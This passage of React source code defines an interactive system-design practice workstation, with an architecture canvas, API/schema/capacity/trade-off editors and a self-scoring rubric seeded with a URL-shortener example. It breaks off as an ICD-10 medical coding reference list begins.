      { id:"kafka",    label:"Kafka",      shortLabel:"Kafka",      icon:"📨" },
      { id:"queue",    label:"Message Queue",shortLabel:"Queue",    icon:"📬" },
      { id:"s3",       label:"Object Store",shortLabel:"S3/GCS",    icon:"🪣" },
      { id:"search",   label:"Elasticsearch",shortLabel:"Search",   icon:"🔍" },
    ],
  },
  {
    id: "infra", label: "Infra / Ops", color: "#B45309", bg: "#FFFBEB", border: "#FDE68A",
    items: [
      { id:"monitor",  label:"Monitoring", shortLabel:"Monitor",   icon:"📡" },
      { id:"ci",       label:"CI/CD",      shortLabel:"CI/CD",     icon:"🚀" },
      { id:"dns",      label:"DNS",        shortLabel:"DNS",       icon:"🗺️" },
    ],
  },
]

// Flat lookup: id → item metadata
const SD_COMP_BY_ID = {}
SD_LAYERS.forEach(layer => {
  layer.items.forEach(item => { SD_COMP_BY_ID[item.id] = { ...item, layerColor: layer.color, layerBg: layer.bg, layerBorder: layer.border } })
})

const SD_RUBRIC = [
  { id:"components",  label:"≥4 components on canvas",   weight:20 },
  { id:"connections", label:"Components connected",       weight:15 },
  { id:"api",         label:"≥2 API endpoints defined",   weight:20 },
  { id:"schema",      label:"Data schema defined",        weight:15 },
  { id:"capacity",    label:"Capacity estimate filled",   weight:15 },
  { id:"tradeoffs",   label:"≥1 trade-off documented",    weight:15 },
]

function SystemDesignWorkstation({ mission, code, onCodeChange }) {
  // ── Canvas state ───────────────────────────────────────────────────────────
  const [nodes, setNodes]           = useState([])
  const [edges, setEdges]           = useState([])
  const [connSrc, setConnSrc]       = useState(null)   // uid of connection source
  const [selected, setSelected]     = useState(null)
  const [dragState, setDragState]   = useState(null)   // {uid, ox, oy}
  const [hovNode, setHovNode]       = useState(null)
  const canvasRef                   = useRef(null)

  // ── UI state ───────────────────────────────────────────────────────────────
  const [leftTab, setLeftTab]       = useState("req")   // req | deliver | rubric
  const [rightTab, setRightTab]     = useState("api")   // api | schema | capacity | tradeoffs
  const [rubricChecks, setChecks]   = useState({})

  // ── Persisted notes (in code field) ───────────────────────────────────────
  const parseCode = (raw) => { try { return JSON.parse(raw || "{}") } catch { return {} } }
  const saved      = parseCode(code)
  const apiRows    = saved.api       || [{ method:"POST", path:"/shorten",   desc:"Shorten a URL",         status:"201" }, { method:"GET", path:"/{code}",   desc:"Redirect to original",  status:"301" }]
  const schRows    = saved.schema    || [{ field:"short_code", type:"CHAR(7)", note:"PK" }, { field:"long_url", type:"TEXT", note:"NOT NULL" }, { field:"created_at", type:"TIMESTAMPTZ", note:"DEFAULT NOW()" }]
  const capRows    = saved.capacity  || [{ metric:"Redirects/sec", formula:"10B ÷ 86400", result:"~115K RPS" }, { metric:"Storage/year", formula:"100M × 500 bytes", result:"50 GB" }]
  const tradeRows  = saved.tradeoffs || [{ decision:"Redirect type", optionA:"301 Permanent", optionB:"302 Temporary", chosen:"" }]
  const assumptions= saved.assumptions || ""

  const persist = (patch) => {
    onCodeChange(JSON.stringify({ ...saved, ...patch, nodes, edges }, null, 2))
  }

  // Sync canvas → code
  React.useEffect(() => {
    onCodeChange(JSON.stringify({ ...saved, nodes, edges }, null, 2))
  }, [nodes, edges]) // eslint-disable-line

  // ── Canvas operations ──────────────────────────────────────────────────────
  const addNode = (item, layerColor) => {
    const count  = nodes.filter(n => n.compId === item.id).length
    const cols   = 5
    const idx    = nodes.length
    setNodes(ns => [...ns, {
      uid:    `${item.id}_${Date.now()}`,
      compId: item.id,
      label:  count > 0 ? `${item.shortLabel} ${count + 1}` : item.shortLabel,
      icon:   item.icon,
      color:  layerColor,
      x:      60 + (idx % cols) * 150,
      y:      60 + Math.floor(idx / cols) * 130,
    }])
  }

  const removeNode = (uid) => {
    setNodes(ns => ns.filter(n => n.uid !== uid))
    setEdges(es => es.filter(e => e.from !== uid && e.to !== uid))
    if (selected === uid) setSelected(null)
    if (connSrc  === uid) setConnSrc(null)
  }

  const nodeDown = (e, uid) => {
    e.stopPropagation()
    if (connSrc) {
      if (connSrc !== uid) {
        setEdges(es => {
          if (es.some(ex => ex.from === connSrc && ex.to === uid)) return es
          return [...es, { id: `e_${Date.now()}`, from: connSrc, to: uid, label:"" }]
        })
      }
      setConnSrc(null)
      return
    }
    setSelected(uid)
    const r = e.currentTarget.getBoundingClientRect()
    setDragState({ uid, ox: e.clientX - r.left, oy: e.clientY - r.top })
  }

  const canvasMouseMove = (e) => {
    if (!dragState) return
    const r = canvasRef.current?.getBoundingClientRect()
    if (!r) return
    const x = e.clientX - r.left - dragState.ox + 52
    const y = e.clientY - r.top  - dragState.oy + 28
    setNodes(ns => ns.map(n => n.uid === dragState.uid ? { ...n, x: Math.max(8, x), y: Math.max(8, y) } : n))
  }

  const rubricScore = SD_RUBRIC.reduce((s, r) => s + (rubricChecks[r.id] ? r.weight : 0), 0)
  const inp = { padding:"4px 7px", border:"1px solid #E8E3DA", borderRadius:5, fontSize:11, fontFamily:"inherit", outline:"none", background:"#ffffff", color:T.ink, width:"100%", boxSizing:"border-box" }
  const METHOD_C = { GET:"#16A34A", POST:"#2563EB", PUT:"#D97706", PATCH:"#7C3AED", DELETE:"#DC2626" }

  return (
    <div style={{ flex:1, display:"flex", overflow:"hidden", minHeight:0, fontFamily:"'DM Sans',sans-serif", background:"#F4F4F0" }}>
      <style>{`
        @keyframes sd-pulse {0%,100%{box-shadow:0 0 0 0 rgba(109,64,160,0.35)}50%{box-shadow:0 0 0 8px rgba(109,64,160,0)}}
        .sd-node-hover { transform: translateY(-1px); }
      `}</style>

      {/* ═══════════════ LEFT — prompt tabs ═══════════════ */}
      <div style={{ width:256, flexShrink:0, borderRight:"1px solid #E8E3DA", display:"flex", flexDirection:"column", background:T.bg, overflow:"hidden" }}>
        <div style={{ display:"flex", borderBottom:"1px solid #E8E3DA", background:"#FAFAFA", flexShrink:0 }}>
          {[{ id:"req",deliver:false, icon:"📋", label:"Prompt" },{ id:"deliver",deliver:true, icon:"📦", label:"Deliver" },{ id:"rubric",deliver:false, icon:"✅", label:"Rubric" }].map(t => (
            <button key={t.id} onClick={() => setLeftTab(t.id)} style={{ flex:1, padding:"9px 0", border:"none", background:"none", borderBottom: leftTab===t.id ? "2px solid #6D40A0" : "2px solid transparent", fontSize:10, fontWeight: leftTab===t.id ? 800 : 500, color: leftTab===t.id ? "#6D40A0" : "#A8A29E", cursor:"pointer", fontFamily:"inherit" }}>
              {t.icon} {t.label}
            </button>
          ))}
        </div>

        <div style={{ flex:1, overflowY:"auto" }}>
          {/* Prompt */}
          {leftTab === "req" && (
            <div style={{ padding:"14px" }}>
              <div style={{ fontSize:13, fontWeight:800, color:T.ink, marginBottom:8, lineHeight:1.3 }}>{mission?.title || "System Design Challenge"}</div>
              <p style={{ margin:"0 0 12px", fontSize:12, color:"#4B5563", lineHeight:1.65 }}>{mission?.scenario || mission?.description || "Design a scalable system meeting the requirements below."}</p>

              <div style={{ fontSize:9, fontWeight:800, color:"#A8A29E", letterSpacing:0.8, textTransform:"uppercase", marginBottom:6 }}>Steps</div>
              {(mission?.steps || ["Define requirements and capacity", "Draw architecture diagram", "Spec API endpoints", "Define data schema", "Calculate capacity", "Document trade-offs"]).map((s, i) => (
                <div key={i} style={{ display:"flex", gap:8, alignItems:"flex-start", marginBottom:6 }}>
                  <div style={{ width:18, height:18, borderRadius:99, background:"#EDE9FE", color:"#6D40A0", fontSize:9, fontWeight:800, display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0, marginTop:1 }}>{i+1}</div>
                  <span style={{ fontSize:11, color:"#475569", lineHeight:1.5 }}>{s}</span>
                </div>
              ))}

              <div style={{ height:1, background:"#F3F4F6", margin:"12px 0" }} />
              <div style={{ fontSize:9, fontWeight:800, color:"#A8A29E", letterSpacing:0.8, textTransform:"uppercase", marginBottom:7 }}>Non-Functional</div>
              {[{icon:"⚡",k:"Latency",   v: mission?.latency       || "p99 < 10ms"          },
                {icon:"☁️",k:"Scale",     v: mission?.scale         || "10B redirects / day"  },
                {icon:"✅",k:"Availability",v:mission?.availability || "99.99% uptime"        },
              ].map(r => (
                <div key={r.k} style={{ display:"flex", alignItems:"center", gap:8, marginBottom:5, padding:"6px 8px", background:T.bg2, borderRadius:7, border:"1px solid #E8E3DA" }}>
                  <span style={{ fontSize:13 }}>{r.icon}</span>
                  <div style={{ minWidth:0 }}>
                    <div style={{ fontSize:9, fontWeight:700, color:"#A8A29E" }}>{r.k}</div>
                    <div style={{ fontSize:11, fontWeight:600, color:T.ink }}>{r.v}</div>
                  </div>
                </div>
              ))}

              <div style={{ height:1, background:"#F3F4F6", margin:"12px 0" }} />
              <div style={{ fontSize:9, fontWeight:800, color:"#A8A29E", letterSpacing:0.8, textTransform:"uppercase", marginBottom:5 }}>Assumptions</div>
              <textarea value={assumptions} onChange={e => persist({ assumptions: e.target.value })}
                placeholder={"e.g.\n– Read:Write ≈ 100:1\n– URLs globally unique\n– No real-time analytics"}
                style={{ ...inp, minHeight:80, fontSize:11, lineHeight:1.55, resize:"vertical", fontFamily:"inherit", border:"1px solid #E8E3DA", padding:"8px 10px" }} />
            </div>
          )}

          {/* Deliverables */}
          {leftTab === "deliver" && (
            <div style={{ padding:"14px", display:"flex", flexDirection:"column", gap:8 }}>
              {[
                { icon:"🏗️", title:"Architecture Diagram", desc:"Place ≥4 components on the canvas and draw connections between them." },
                { icon:"🔌", title:"API Design",           desc:"Define the key endpoints in the API tab on the right." },
                { icon:"🗃️", title:"Data Schema",          desc:"Specify the main table(s) and their fields in the Schema tab." },
                { icon:"📊", title:"Capacity Estimates",   desc:"Fill in QPS, storage/year, and bandwidth in the Capacity tab." },
                { icon:"⚖️", title:"Trade-off Analysis",   desc:"Document 2 design decisions and your reasoning in Tradeoffs." },
              ].map(d => (
                <div key={d.title} style={{ padding:"10px 11px", background:T.bg2, borderRadius:9, border:"1px solid #E8E3DA" }}>
                  <div style={{ display:"flex", gap:8, alignItems:"center", marginBottom:3 }}>
                    <span style={{ fontSize:16 }}>{d.icon}</span>
                    <span style={{ fontSize:12, fontWeight:700, color:T.ink }}>{d.title}</span>
                  </div>
                  <p style={{ margin:0, fontSize:11, color:"#A8A29E", lineHeight:1.5 }}>{d.desc}</p>
                </div>
              ))}
            </div>
          )}

          {/* Rubric */}
          {leftTab === "rubric" && (
            <div style={{ padding:"14px" }}>
              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:6 }}>
                <span style={{ fontSize:11, fontWeight:800, color:"#475569" }}>Self-check</span>
                <span style={{ fontSize:13, fontWeight:900, color: rubricScore>=80 ? "#16A34A" : rubricScore>=50 ? "#D97706" : "#A8A29E", fontVariantNumeric:"tabular-nums" }}>{rubricScore}%</span>
              </div>
              <div style={{ height:6, background:"#F3F4F6", borderRadius:3, overflow:"hidden", marginBottom:14 }}>
                <div style={{ height:"100%", width:`${rubricScore}%`, background: rubricScore>=80 ? "#16A34A" : "#6D40A0", borderRadius:3, transition:"width 0.35s" }} />
              </div>
              {SD_RUBRIC.map(r => {
                const on = rubricChecks[r.id]
                return (
                  <div key={r.id} onClick={() => setChecks(c => ({ ...c, [r.id]: !c[r.id] }))}
                    style={{ display:"flex", gap:9, alignItems:"center", padding:"8px 10px", borderRadius:8, marginBottom:5, border:`1.5px solid ${on ? "#BBF7D0" : "#E8E3DA"}`, background: on ? "#F0FDF4" : T.bg2, cursor:"pointer", transition:"all 0.15s" }}>
                    <div style={{ width:18, height:18, borderRadius:5, border:`2px solid ${on ? "#16A34A" : "#D6D0C8"}`, background: on ? "#16A34A" : "transparent", display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0 }}>
                      {on && <span style={{ fontSize:10, color:"#ffffff", lineHeight:1 }}>✓</span>}
                    </div>
                    <div style={{ flex:1 }}>
                      <div style={{ fontSize:11, fontWeight:600, color: on ? "#15803D" : "#475569" }}>{r.label}</div>
                      <div style={{ fontSize:9, color:"#A8A29E" }}>{r.weight}% of score</div>
                    </div>
                  </div>
                )
              })}
            </div>
          )}
        </div>
      </div>

      {/* ═══════════════ CENTER — Canvas ═══════════════ */}
      <div style={{ flex:1, display:"flex", flexDirection:"column", overflow:"hidden", minWidth:0 }}>

        {/* Palette bar */}
        <div style={{ background:T.bg, borderBottom:"1px solid #E8E3DA", flexShrink:0 }}>
          {connSrc ? (
            <div style={{ padding:"8px 14px", display:"flex", alignItems:"center", gap:10, background:"#F5F3FF", borderBottom:"1px solid #DDD6FE" }}>
              <div style={{ width:8, height:8, borderRadius:"50%", background:"#7C3AED", animation:"sd-pulse 1.5s infinite" }} />
              <span style={{ fontSize:11, fontWeight:700, color:"#6D40A0" }}>Click a component to connect it, or</span>
              <button onClick={() => setConnSrc(null)} style={{ padding:"3px 10px", borderRadius:5, border:"1px solid #C4B5FD", background:"#EDE9FE", fontSize:11, fontWeight:700, color:"#7C3AED", cursor:"pointer", fontFamily:"inherit" }}>Cancel</button>
            </div>
          ) : (
            <div style={{ padding:"5px 10px 6px", display:"flex", gap:6, overflowX:"auto", scrollbarWidth:"none", alignItems:"flex-start" }}>
              {SD_LAYERS.map(layer => (
                <div key={layer.id} style={{ flexShrink:0, background:layer.bg, border:`1px solid ${layer.border}`, borderRadius:9, padding:"5px 7px 6px" }}>
                  <div style={{ fontSize:8, fontWeight:800, color:layer.color, letterSpacing:0.6, textTransform:"uppercase", marginBottom:5, textAlign:"center" }}>{layer.label}</div>
                  <div style={{ display:"flex", gap:4 }}>
                    {layer.items.map(item => (
                      <button key={item.id} onClick={() => addNode(item, layer.color)}
                        title={`Add ${item.label}`}
                        style={{ display:"flex", flexDirection:"column", alignItems:"center", gap:2, padding:"5px 7px", borderRadius:7, border:`1px solid transparent`, background:"transparent", cursor:"pointer", transition:"all 0.12s", minWidth:46 }}
                        onMouseEnter={e => { e.currentTarget.style.background = "#F0EDE8"; e.currentTarget.style.borderColor = layer.border; e.currentTarget.style.boxShadow = "0 2px 6px rgba(0,0,0,0.08)" }}
                        onMouseLeave={e => { e.currentTarget.style.background = "transparent"; e.currentTarget.style.borderColor = "transparent"; e.currentTarget.style.boxShadow = "none" }}>
                        <span style={{ fontSize:18, lineHeight:1 }}>{item.icon}</span>
                        <span style={{ fontSize:8.5, fontWeight:600, color:layer.color, whiteSpace:"nowrap", lineHeight:1.2, textAlign:"center" }}>{item.shortLabel}</span>
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Canvas */}
        <div
          ref={canvasRef}
          onMouseMove={canvasMouseMove}
          onMouseUp={() => setDragState(null)}
          onMouseLeave={() => setDragState(null)}
          onClick={e => { if (e.target === canvasRef.current) { setSelected(null); setConnSrc(null) } }}
          style={{ flex:1, position:"relative", overflow:"hidden", background:"#FAFAF7", cursor: connSrc ? "crosshair" : "default" }}
        >
          {/* Dot-grid */}
          <svg style={{ position:"absolute", inset:0, width:"100%", height:"100%", pointerEvents:"none" }}>
            <defs>
              <pattern id="sd-dots" x="0" y="0" width="24" height="24" patternUnits="userSpaceOnUse">
                <circle cx="1" cy="1" r="1" fill="#D4D4CC" />
              </pattern>
            </defs>
            <rect width="100%" height="100%" fill="url(#sd-dots)" />

            {/* Edge arrows */}
            <defs>
              <marker id="sd-arrow" viewBox="0 0 10 8" refX="9" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
                <path d="M0,0 L10,4 L0,8 Z" fill="#A8A29E" />
              </marker>
              <marker id="sd-arrow-sel" viewBox="0 0 10 8" refX="9" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
                <path d="M0,0 L10,4 L0,8 Z" fill="#6D40A0" />
              </marker>
            </defs>
            {edges.map((edge, ei) => {
              const fn = nodes.find(n => n.uid === edge.from)
              const tn = nodes.find(n => n.uid === edge.to)
              if (!fn || !tn) return null
              // Port points (center-bottom / center-top)
              const fx = fn.x, fy = fn.y + 34
              const tx = tn.x, ty = tn.y - 4
              const cp1x = fx, cp1y = (fy + ty) / 2
              const cp2x = tx, cp2y = (fy + ty) / 2
              const mx = (fx + tx) / 2, my = (fy + ty) / 2
              return (
                <g key={edge.id}>
                  <path d={`M${fx},${fy} C${cp1x},${cp1y} ${cp2x},${cp2y} ${tx},${ty}`}
                    stroke="#A8A29E" strokeWidth="1.8" fill="none" markerEnd="url(#sd-arrow)"
                    strokeDasharray="none" opacity="0.85" />
                  {/* Midpoint delete handle */}
                  <g style={{ cursor:"pointer" }} onClick={e => { e.stopPropagation(); setEdges(es => es.filter((_,i) => i !== ei)) }}>
                    <circle cx={mx} cy={my} r={8} fill="#ffffff" stroke="#E8E3DA" strokeWidth="1.5" />
                    <text x={mx} y={my+4} fontSize="9" fill="#A8A29E" textAnchor="middle">✕</text>
                  </g>
                </g>
              )
            })}
          </svg>

          {/* Nodes */}
          {nodes.map(node => {
            const isSel = selected === node.uid
            const isSrc = connSrc  === node.uid
            const isHov = hovNode  === node.uid
            return (
              <div
                key={node.uid}
                onMouseDown={e => nodeDown(e, node.uid)}
                onMouseEnter={() => setHovNode(node.uid)}
                onMouseLeave={() => setHovNode(null)}
                style={{
                  position:"absolute",
                  left: node.x - 52, top: node.y - 28,
                  width:104, minHeight:68,
                  background:"#ffffff",
                  borderRadius:12,
                  border:`2px solid ${isSrc ? "#7C3AED" : isSel ? node.color : isHov ? node.color + "60" : "#E8E3DA"}`,
                  boxShadow: isSrc
                    ? `0 0 0 4px rgba(124,58,237,0.2), 0 4px 16px rgba(124,58,237,0.25)`
                    : isSel
                      ? `0 0 0 3px ${node.color}25, 0 8px 20px ${node.color}30`
                      : isHov
                        ? `0 4px 12px rgba(0,0,0,0.10)`
                        : `0 1px 4px rgba(0,0,0,0.06)`,
                  display:"flex", flexDirection:"column", alignItems:"center",
                  padding:"10px 8px 7px",
                  cursor: connSrc ? "crosshair" : "grab",
                  userSelect:"none",
                  transition:"border-color 0.12s, box-shadow 0.12s",
                  zIndex: isSel || isSrc ? 20 : isHov ? 10 : 1,
                  animation: isSrc ? "sd-pulse 1.5s infinite" : "none",
                  // Color bar at top
                  overflow:"visible",
                }}
              >
                {/* Top accent bar */}
                <div style={{ position:"absolute", top:-2, left:8, right:8, height:3, borderRadius:"2px 2px 0 0", background: isSel || isSrc ? node.color : isHov ? node.color + "80" : node.color + "40", transition:"background 0.12s" }} />

                <span style={{ fontSize:22, lineHeight:1, marginBottom:4 }}>{node.icon}</span>
                <div style={{ fontSize:9, fontWeight:800, color:"#475569", textAlign:"center", lineHeight:1.3, maxWidth:90, wordBreak:"break-word" }}>{node.label}</div>

                {/* Action buttons — visible on select */}
                {(isSel || isSrc) && (
                  <div style={{ position:"absolute", top:-18, right:-6, display:"flex", gap:4 }}>
                    {!isSrc && (
                      <button onClick={e => { e.stopPropagation(); setConnSrc(node.uid); setSelected(null) }}
                        title="Draw connection to another component"
                        style={{ width:22, height:22, borderRadius:99, background:"#6D40A0", border:"none", color:"#ffffff", fontSize:11, cursor:"pointer", display:"flex", alignItems:"center", justifyContent:"center", boxShadow:"0 2px 6px rgba(109,64,160,0.4)" }}>
                        →
                      </button>
                    )}
                    <button onClick={e => { e.stopPropagation(); removeNode(node.uid) }}
                      title="Remove this component"
                      style={{ width:22, height:22, borderRadius:99, background:"#DC2626", border:"none", color:"#ffffff", fontSize:11, cursor:"pointer", display:"flex", alignItems:"center", justifyContent:"center", boxShadow:"0 2px 6px rgba(220,38,38,0.3)" }}>
                      ✕
                    </button>
                  </div>
                )}
              </div>
            )
          })}

          {/* Empty state */}
          {nodes.length === 0 && (
            <div style={{ position:"absolute", inset:0, display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", pointerEvents:"none", gap:10 }}>
              <div style={{ fontSize:40, opacity:0.2 }}>🏗️</div>
              <div style={{ fontSize:14, fontWeight:800, color:"#C4C4BE" }}>Architecture Canvas</div>
              <div style={{ fontSize:12, color:"#D4D4CC", textAlign:"center", maxWidth:240, lineHeight:1.5 }}>
                Add components from the palette above.<br/>Drag to reposition · Click → to connect.
              </div>
            </div>
          )}
        </div>

        {/* Canvas footer */}
        <div style={{ borderTop:"1px solid #E8E3DA", background:T.bg2, padding:"5px 16px", display:"flex", gap:16, alignItems:"center", flexShrink:0 }}>
          <span style={{ fontSize:10, color:"#A8A29E" }}>
            <strong style={{ color:"#6B6560" }}>Click palette</strong> to add ·
            <strong style={{ color:"#6B6560" }}> Drag</strong> to move ·
            <strong style={{ color:"#6B6560" }}> Select → →</strong> to draw arrow ·
            <strong style={{ color:"#6B6560" }}> ✕ on edge</strong> to remove
          </span>
          <div style={{ marginLeft:"auto", display:"flex", gap:10, fontSize:10, color:"#A8A29E" }}>
            <span>{nodes.length} components</span>
            <span>{edges.length} connections</span>
          </div>
        </div>
      </div>

      {/* ═══════════════ RIGHT — spec notes ═══════════════ */}
      <div style={{ width:264, flexShrink:0, borderLeft:"1px solid #E8E3DA", display:"flex", flexDirection:"column", background:T.bg, overflow:"hidden" }}>

        {/* Tab bar */}
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", borderBottom:"1px solid #E8E3DA", background:"#FAFAFA", flexShrink:0 }}>
          {[{ id:"api",icon:"🔌",label:"API" },{ id:"schema",icon:"🗃️",label:"Schema" },{ id:"capacity",icon:"📊",label:"Capacity" },{ id:"tradeoffs",icon:"⚖️",label:"Trade-offs" }].map(t => (
            <button key={t.id} onClick={() => setRightTab(t.id)} style={{ padding:"8px 0", border:"none", background:"none", borderBottom: rightTab===t.id ? "2px solid #1D4ED8" : "2px solid transparent", fontSize:9, fontWeight: rightTab===t.id ? 800 : 500, color: rightTab===t.id ? "#1D4ED8" : "#A8A29E", cursor:"pointer", fontFamily:"inherit", display:"flex", flexDirection:"column", alignItems:"center", gap:2 }}>
              <span style={{ fontSize:13 }}>{t.icon}</span>{t.label}
            </button>
          ))}
        </div>

        <div style={{ flex:1, overflowY:"auto" }}>

          {/* API tab */}
          {rightTab === "api" && (
            <div style={{ padding:"10px" }}>
              <div style={{ fontSize:10, fontWeight:800, color:"#475569", marginBottom:8 }}>Endpoints</div>
              {apiRows.map((row, i) => (
                <div key={i} style={{ marginBottom:8, padding:"9px 10px", background:T.bg2, borderRadius:9, border:"1px solid #E8E3DA" }}>
                  <div style={{ display:"flex", gap:5, marginBottom:5, alignItems:"center" }}>
                    <select value={row.method} onChange={e => persist({ api: apiRows.map((r,j) => j===i ? {...r, method:e.target.value} : r) })}
                      style={{ padding:"3px 5px", border:"1px solid #E8E3DA", borderRadius:5, fontWeight:800, fontSize:10, color:METHOD_C[row.method]||"#475569", background:"#ffffff", cursor:"pointer", outline:"none" }}>
                      {["GET","POST","PUT","PATCH","DELETE"].map(m => <option key={m}>{m}</option>)}
                    </select>
                    <input value={row.path} onChange={e => persist({ api: apiRows.map((r,j) => j===i ? {...r, path:e.target.value} : r) })}
                      placeholder="/path" style={{ ...inp, fontFamily:"'DM Mono',monospace", fontSize:10, flex:1 }} />
                    <input value={row.status} onChange={e => persist({ api: apiRows.map((r,j) => j===i ? {...r, status:e.target.value} : r) })}
                      placeholder="200" style={{ ...inp, width:36, textAlign:"center" }} />
                  </div>
                  <input value={row.desc} onChange={e => persist({ api: apiRows.map((r,j) => j===i ? {...r, desc:e.target.value} : r) })}
                    placeholder="Description" style={inp} />
                </div>
              ))}
              <button onClick={() => persist({ api: [...apiRows, { method:"GET", path:"/", desc:"", status:"200" }] })}
                style={{ width:"100%", padding:"5px 0", borderRadius:6, border:"1.5px dashed #D6D0C8", background:"transparent", fontSize:11, color:"#A8A29E", cursor:"pointer", fontWeight:600 }}>+ Add endpoint</button>
            </div>
          )}

          {/* Schema tab */}
          {rightTab === "schema" && (
            <div style={{ padding:"10px" }}>
              <div style={{ fontSize:10, fontWeight:800, color:"#475569", marginBottom:8 }}>Table Fields</div>
              <div style={{ display:"grid", gridTemplateColumns:"1fr 80px 60px", gap:3, marginBottom:5 }}>
                {["Field","Type","Notes"].map(h => <div key={h} style={{ fontSize:8.5, fontWeight:700, color:"#A8A29E", textTransform:"uppercase", letterSpacing:0.4 }}>{h}</div>)}
              </div>
              {schRows.map((row, i) => (
                <div key={i} style={{ display:"grid", gridTemplateColumns:"1fr 80px 60px", gap:3, marginBottom:4 }}>
                  <input value={row.field} onChange={e => persist({ schema: schRows.map((r,j) => j===i ? {...r, field:e.target.value} : r) })}
                    placeholder="field_name" style={{ ...inp, fontFamily:"'DM Mono',monospace", fontSize:10 }} />
                  <input value={row.type} onChange={e => persist({ schema: schRows.map((r,j) => j===i ? {...r, type:e.target.value} : r) })}
                    placeholder="TEXT" style={{ ...inp, fontFamily:"'DM Mono',monospace", fontSize:10 }} />
                  <input value={row.note} onChange={e => persist({ schema: schRows.map((r,j) => j===i ? {...r, note:e.target.value} : r) })}
                    placeholder="PK" style={{ ...inp, fontSize:10 }} />
                </div>
              ))}
              <button onClick={() => persist({ schema: [...schRows, { field:"", type:"", note:"" }] })}
                style={{ width:"100%", marginTop:4, padding:"5px 0", borderRadius:6, border:"1.5px dashed #D6D0C8", background:"transparent", fontSize:11, color:"#A8A29E", cursor:"pointer", fontWeight:600 }}>+ Add field</button>
            </div>
          )}

          {/* Capacity tab */}
          {rightTab === "capacity" && (
            <div style={{ padding:"10px" }}>
              <div style={{ fontSize:10, fontWeight:800, color:"#475569", marginBottom:8 }}>Estimates</div>
              {capRows.map((row, i) => (
                <div key={i} style={{ marginBottom:8, padding:"8px 9px", background:"#EFF6FF", borderRadius:8, border:"1px solid #BFDBFE" }}>
                  <input value={row.metric} onChange={e => persist({ capacity: capRows.map((r,j) => j===i ? {...r, metric:e.target.value} : r) })}
                    placeholder="Metric" style={{ ...inp, fontWeight:700, marginBottom:4, background:"transparent", border:"none", padding:"0", fontSize:11 }} />
                  <div style={{ display:"flex", gap:5, alignItems:"center" }}>
                    <input value={row.formula} onChange={e => persist({ capacity: capRows.map((r,j) => j===i ? {...r, formula:e.target.value} : r) })}
                      placeholder="calculation" style={{ ...inp, fontFamily:"'DM Mono',monospace", fontSize:10, flex:1 }} />
                    <span style={{ fontSize:11, color:"#60A5FA", fontWeight:700 }}>→</span>
                    <input value={row.result} onChange={e => persist({ capacity: capRows.map((r,j) => j===i ? {...r, result:e.target.value} : r) })}
                      placeholder="result" style={{ ...inp, width:68, fontWeight:800, color:"#1D4ED8", fontSize:10 }} />
                  </div>
                </div>
              ))}
              <button onClick={() => persist({ capacity: [...capRows, { metric:"", formula:"", result:"" }] })}
                style={{ width:"100%", padding:"5px 0", borderRadius:6, border:"1.5px dashed #D6D0C8", background:"transparent", fontSize:11, color:"#A8A29E", cursor:"pointer", fontWeight:600 }}>+ Add estimate</button>

              <div style={{ marginTop:12, borderTop:"1px solid #E8E3DA", paddingTop:10 }}>
                <div style={{ fontSize:9, fontWeight:700, color:"#A8A29E", textTransform:"uppercase", letterSpacing:0.5, marginBottom:6 }}>Formula cheatsheet</div>
                {[["QPS","daily ÷ 86,400"],["Storage/yr","rows × size × 365"],["Cache","traffic × 0.2"],["Bandwidth","QPS × resp_size"]].map(([k,v]) => (
                  <div key={k} style={{ display:"flex", justifyContent:"space-between", padding:"3px 0", borderBottom:"1px solid #F2EDE4" }}>
                    <span style={{ fontSize:10, fontWeight:600, color:"#475569" }}>{k}</span>
                    <span style={{ fontSize:9, color:"#A8A29E", fontFamily:"'DM Mono',monospace" }}>{v}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Tradeoffs tab */}
          {rightTab === "tradeoffs" && (
            <div style={{ padding:"10px" }}>
              <div style={{ fontSize:10, fontWeight:800, color:"#475569", marginBottom:8 }}>Design Decisions</div>
              {tradeRows.map((row, i) => (
                <div key={i} style={{ marginBottom:10, padding:"9px 10px", background:"#FAF7F2", borderRadius:9, border:"1px solid #E8E3DA" }}>
                  <input value={row.decision} onChange={e => persist({ tradeoffs: tradeRows.map((r,j) => j===i ? {...r, decision:e.target.value} : r) })}
                    placeholder="Decision (e.g. Redirect type)" style={{ ...inp, fontWeight:700, marginBottom:6 }} />
                  <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:4, marginBottom:6 }}>
                    <div>
                      <div style={{ fontSize:8, fontWeight:700, color:"#A8A29E", marginBottom:2 }}>OPTION A</div>
                      <input value={row.optionA} onChange={e => persist({ tradeoffs: tradeRows.map((r,j) => j===i ? {...r, optionA:e.target.value} : r) })}
                        placeholder="e.g. 301" style={{ ...inp, fontSize:10 }} />
                    </div>
                    <div>
                      <div style={{ fontSize:8, fontWeight:700, color:"#A8A29E", marginBottom:2 }}>OPTION B</div>
                      <input value={row.optionB} onChange={e => persist({ tradeoffs: tradeRows.map((r,j) => j===i ? {...r, optionB:e.target.value} : r) })}
                        placeholder="e.g. 302" style={{ ...inp, fontSize:10 }} />
                    </div>
                  </div>
                  <div style={{ fontSize:8, fontWeight:700, color:"#A8A29E", marginBottom:2 }}>CHOSEN — WHY?</div>
                  <input value={row.chosen} onChange={e => persist({ tradeoffs: tradeRows.map((r,j) => j===i ? {...r, chosen:e.target.value} : r) })}
                    placeholder="I chose … because …" style={inp} />
                </div>
              ))}
              <button onClick={() => persist({ tradeoffs: [...tradeRows, { decision:"", optionA:"", optionB:"", chosen:"" }] })}
                style={{ width:"100%", padding:"5px 0", borderRadius:6, border:"1.5px dashed #D6D0C8", background:"transparent", fontSize:11, color:"#A8A29E", cursor:"pointer", fontWeight:600 }}>+ Add decision</button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// MEDICAL CODING WORKSTATION — ICD-10 / CPT structured coding console
// ─────────────────────────────────────────────────────────────────────────────
const ICD10_QUICK = [
  { code: "J18.9",  desc: "Pneumonia, unspecified organism" },
  { code: "I10",    desc: "Essential (primary) hypertension" },
  { code: "E11.9",  desc: "Type 2 diabetes mellitus w/o complications" },
